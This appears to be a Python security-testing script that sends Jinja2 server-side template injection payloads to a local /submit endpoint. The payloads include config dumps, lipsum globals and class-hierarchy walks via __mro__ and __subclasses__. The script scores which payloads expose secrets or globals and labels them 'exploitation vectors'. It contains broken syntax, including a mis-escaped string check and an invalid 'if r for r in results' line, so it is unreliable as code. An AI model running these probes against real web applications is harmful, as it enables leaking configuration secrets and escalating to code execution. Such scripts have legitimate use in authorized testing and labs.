import requests
import json
import sys

def test_jinja2_introspection():
    """Test Jinja2 SSTI introspection payloads on /submit endpoint"""
    
    # Target endpoint
    target_url = "http://127.0.0.1:33126/submit"
    
    # Introspection payloads to test
    payloads = [
        "{{ config }}",
        "{{ request.__dict__ }}",
        "{{ globals() }}",
        "{{ locals() }}",
        "{{ request.args }}",
        "{{ request.form }}",
        "{{ _self }}",
        "{{ lipsum.__globals__ }}",
        "{{ ''.__class__.__mro__[1].__subclasses__()[:20] }}"
    ]
    
    # Store results
    results = []
    
    print("=" * 80)
    print("JINJA2 SSTI INTROSPECTION TEST")
    print(f"Target: {target_url}")
    print("=" * 80)
    
    for idx, payload in enumerate(payloads, 1):
        print(f"\n[TEST {idx}/{len(payloads)}] Testing payload: {payload}")
        print("-" * 60)
        
        try:
            # Send POST request with payload in 'name' field
            data = {'name': payload}
            response = requests.post(target_url, data=data, timeout=10)
            
            # Extract response information
            status_code = response.status_code
            response_text = response.text.strip()
            content_length = len(response_text)
            
            print(f"Status Code: {status_code}")
            print(f"Content Length: {content_length} bytes")
            print(f"Response:\n{response_text}")
            
            # Analyze template evaluation
            evaluation_occurred = "{{" not in response_text or payload not in response_text
            
            # Check for specific patterns in response
            analysis = {
                'payload': payload,
                'status_code': status_code,
                'content_length': content_length,
                'evaluation_occurred': evaluation_occurred,
                'has_config_info': False,
                'has_request_info': False,
                'has_class_hierarchy': False,
                'has_globals': False,
                'has_locals': False,
                'has_template_self': False,
                'has_error_message': False,
                'error_text': None,
                'vulnerable': evaluation_occurred and status_code == 200
            }
            
            # Detect different types of responses
            if "Config" in response_text or "config" in response_text.lower():
                analysis['has_config_info'] = True
                print("[+] CONFIG INFO DETECTED: Configuration data exposed")
            
            if "request" in response_text and (".args" in response_text or ".form" in response_text or ".method" in response_text):
                analysis['has_request_info'] = True
                print("[+] REQUEST OBJECT DETECTED: Request context accessible")
            
            if "class" in response_text and "mro" in response_text and "object" in response_text:
                analysis['has_class_hierarchy'] = True
                print("[+] CLASS HIERARCHY DETECTED: Python object introspection working")
            
            if "globals" in response_text and "__builtins__" in response_text:
                analysis['has_globals'] = True
                print("[+] GLOBALS DETECTED: Global namespace accessible")
            
            if "lipsum" in response_text.lower() and "globals" in response_text.lower():
                analysis['has_globals'] = True
                print("[+] LIPSUM GLOBALS DETECTED: Template context globals accessible")
            
            if "_self" in response_text or "Module" in response_text:
                analysis['has_template_self'] = True
                print("[+] SELF REFERENCE DETECTED: Template module accessible")
            
            # Check for error messages
            if status_code >= 400 or "error" in response_text.lower() or "exception" in response_text.lower():
                analysis['has_error_message'] = True
                analysis['error_text'] = response_text[:200] if len(response_text) > 200 else response_text
                print(f"[!] ERROR DETECTED: {analysis['error_text']}")
            
            # Critical evaluation check
            if evaluation_occurred and "{\" in response_text and "\"" in response_text:
                print("[!] CRITICAL: JSON/Serialized data detected - deep template evaluation")
            
            if content_length < 20 and ("{{" in response_text or payload in response_text):
                print("[-] Payload appears as literal - no template evaluation")
            
            elif evaluation_occurred:
                print(f"[!] SUCCESS: Template evaluation occurred!")
                print(f"    Returned Type: {type(response_text)}")
                print(f"    Evaluation Depth: {'High' if len(response_text) > 100 else 'Partial'}")
            
            results.append(analysis)
            print(f"\nVulnerable: {analysis['vulnerable']}")
            
        except requests.exceptions.Timeout:
            print(f"[!] ERROR: Request timed out")
            results.append({
                'payload': payload,
                'error': 'timeout',
                'vulnerable': False
            })
        except requests.exceptions.ConnectionError:
            print(f"[!] ERROR: Connection failed")
            results.append({
                'payload': payload,
                'error': 'connection',
                'vulnerable': False
            })
        except Exception as e:
            print(f"[!] ERROR: {str(e)}")
            results.append({
                'payload': payload,
                'error': str(e),
                'vulnerable': False
            })
    
    # Summary analysis
    print("\n" + "=" * 80)
    print("SUMMARY ANALYSIS")
    print("=" * 80)
    
    vulnerable_payloads = [r for r in results if r.get('vulnerable', False)]
    print(f"\nTotal Payloads Tested: {len(payloads)}")
    print(f"Vulnerable/Executing: {len(vulnerable_payloads)}")
    print(f"Filtered/Blocked: {len(payloads) - len(vulnerable_payloads)}")
    
    if vulnerable_payloads:
        print("\n[SUCCESSFUL PAYLOADS]")
        for r in vulnerable_payloads:
            print(f"  ✓ {r['payload']}")
            if r['has_config_info']:
                print(f"    → Config data exposed")
            if r['has_request_info']:
                print(f"    → Request context accessible")
            if r['has_class_hierarchy']:
                print(f"    → Python class hierarchy visible")
            if r['has_globals']:
                print(f"    → Global namespace accessible")
            if r['has_template_self']:
                print(f"    → Template _self accessible")
    
    # Identify best exploitation vectors
    print("\n[EXPLOITATION VECTORS]")
    
    # Globals access is most valuable
    globals_payloads = [r for r in vulnerable_payloads if r['has_globals']]
    if globals_payloads:
        print("  [HIGH] Global namespace accessible via:")
        for r in globals_payloads:
            print(f"         → {r['payload']}")
    
    # Config access is valuable for secrets
    config_payloads = [r for r in vulnerable_payloads if r['has_config_info']]
    if config_payloads:
        print("  [MEDIUM] Configuration data accessible via:")
        for r in config_payloads:
            print(f"         → {r['payload']}")
    
    # Class hierarchy for Python exploitation
    class_payloads = [r for r in vulnerable_payloads if r['has_class_hierarchy']]
    if class_payloads:
        print("  [HIGH] Python class introspection working via:")
        for r in class_payloads:
            print(f"         → {r['payload']}")
    
    # Detect template engine version based on available objects
    template_info = []
    if r for r in results if "lipsum" in r.get('payload', '').lower() and r.get('vulnerable'):
        template_info.append("Jinja2 confirmed (lipsum object)")
    
    if template_info:
        print(f"\n[TEMPLATE ENGINE DETECTED]")
        for info in template_info:
            print(f"  → {info}")
    
    # Write detailed results to JSON for analysis
    print(f"\n" + "=" * 80)
    print("Detailed results captured for further analysis")
    print("=" * 80)

if __name__ == '__main__':
    test_jinja2_introspection()

